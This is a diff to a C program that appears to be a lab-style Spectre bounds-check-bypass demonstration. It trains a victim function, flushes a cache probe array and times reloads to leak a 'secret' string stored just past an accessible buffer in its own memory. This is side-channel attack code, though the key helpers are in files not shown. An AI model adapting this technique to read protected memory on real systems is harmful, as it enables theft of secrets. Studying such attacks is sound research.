@@ -4,10 +4,20 @@
 #include "gen_array.c"
 #include "time_and_flush.c"
 
-volatile char* ACCESSIBLE    = "notsecret";
-volatile char* SECRET        = "zhis is a secret message";
+void print_arr(int* results) {
+    for(int i = 0; i < N_PAGES; i++) printf("%d, ", results[i]); printf("\n");
 
-int ACCESSIBLE_SIZE = 10;
+    printf("chars: ");
+    for(int i = 0; i < N_PAGES; i++) {
+        if(results[i] < 100) printf("'%c' (%d)\t", i, i);
+    }
+    printf("time for 1st secret char (t): %d\n", results[116]);
+}
+
+char* ACCESSIBLE    = "notsecretthis is a secret message";
+char* SECRET;
+
+int ACCESSIBLE_SIZE = 9;
 int SECRET_SIZE     = 25;
 
 int COMBINED_SIZE;
@@ -32,43 +42,27 @@ int* get_byte(int index) {
 
     for(int i = 0; i < ACCESSIBLE_SIZE; i++) {
         victim_func(i, arr);
-        __sync_synchronize();
-        flush((void*)&arr[ACCESSIBLE[i]]);
     }
 
-    //flush_arr((void*)arr);
-    //__sync_synchronize();
-
-    //__sync_synchronize();
-    victim_func(index, arr);
     __sync_synchronize();
+    flush_arr(arr);
+    __sync_synchronize();
+    victim_func(index, arr);
 
     int* results = reload(arr);
     unmap_cache_pages(arr);
     return results;
 }
 
-void print_arr(int* results) {
-    //for(int i = 0; i < N_PAGES; i++) printf("%d, ", results[i]);
-
-    printf("chars: ");
-    for(int i = 0; i < N_PAGES; i++) {
-        if(results[i] < 100) printf("'%c' (%d)\t", i, i);
-    }
-    printf("time for 1st secret char (t): %d\n", results[116]);
-}
-
 int main(int argc, char* argv[]) {
     COMBINED_SIZE = ACCESSIBLE_SIZE + SECRET_SIZE;
+    SECRET = ACCESSIBLE + ACCESSIBLE_SIZE;
     for(int i = 0; i < COMBINED_SIZE; i++) printf("%c", ACCESSIBLE[i]); printf("\n");
 
-    //printf("char1:  '%c' (%d)\n", ACCESSIBLE[0],  ACCESSIBLE[0]);
-    printf("char10: '%c' (%d)\n", ACCESSIBLE[10], ACCESSIBLE[10]);
-    int* results = get_byte(4);
+    int getting_byte = ACCESSIBLE_SIZE; //is 't'
+    printf("getting ACCESSIBLE[%i] = '%c'\n", getting_byte, ACCESSIBLE[getting_byte]);
+    int* results = get_byte(getting_byte);
     print_arr(results);
-    //for(int i = ACCESSIBLE_SIZE+1; i < COMBINED_SIZE; i++) {
-    //    int* results = get_byte(i);
-    //    print_arr(results);
-    //}
+
     free(results);
 }
